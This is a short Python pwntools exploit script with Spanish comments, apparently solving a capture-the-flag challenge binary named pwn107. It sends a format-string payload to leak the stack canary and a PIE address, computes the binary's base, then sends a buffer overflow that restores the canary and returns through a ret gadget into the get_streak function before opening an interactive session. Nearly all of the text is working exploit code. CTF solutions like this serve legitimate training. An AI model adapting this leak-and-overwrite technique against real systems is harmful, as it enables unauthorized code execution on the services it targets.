"""
; var const char *format @ rbp-0x40
; var void *buf @ rbp-0x20
; var int64_t canary @ rbp-0x8


%13$p -> canario
%23$p -> leak de pie/direccion de la funcion main
"""

#!/usr/bin/env python3
# Exploit en LOCAL no funciona en REMOTE los offsets del FMS son distintos

from pwn import *
from pwn import p64
exe = ELF("./pwn107.elf", checksec=False)

context.binary = exe
context.log_level = 'info'

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("10.10.71.63", 9007)

    return r


def main():
    r = conn()
    primer_payload = "%13$p|%23$p"
    r.recv()
    r.sendline(primer_payload)
    r.recvuntil(b'streak:')
    output = r.recvuntil(b'\n').strip(b'\n').split(b'|')
    canario = int(output[0],16)
    leak_pie = int(output[1], 16)

    # Le restamos la dirección leakeada al offset de la dirección de la función main para
    # sacar la dirección base donde está cargado el binario (PIE)
    base_addr = leak_pie - 0x00000992
    offset_get_streak = exe.symbols['get_streak'] + base_addr

    # Log info
    log.info("=====================================")
    log.info(f"Base del binario: 0x{base_addr:x}")
    log.info(f"Canario: 0x{canario:x}")
    log.info(f"Dirreción get_streak: 0x{offset_get_streak:x}")
    log.info("=====================================")


    # Sacado con ropper 
    ret_gadget = 0x00000000000006fe + base_addr

    # Padding con As hasta llegar al canario, escribimos el canario, sobreescribimos rbp con Bs, 
    # añadimos un gadget para stack alignment en ubuntu y después la dirección de la función get_streak 
    payload_final = b'A'*(0x20 - 0x8) + p64(canario) + b'B'*0x8 + p64(ret_gadget) + p64(offset_get_streak)
    r.sendline(payload_final)
    # pause()
    r.interactive()


if __name__ == "__main__":
    main()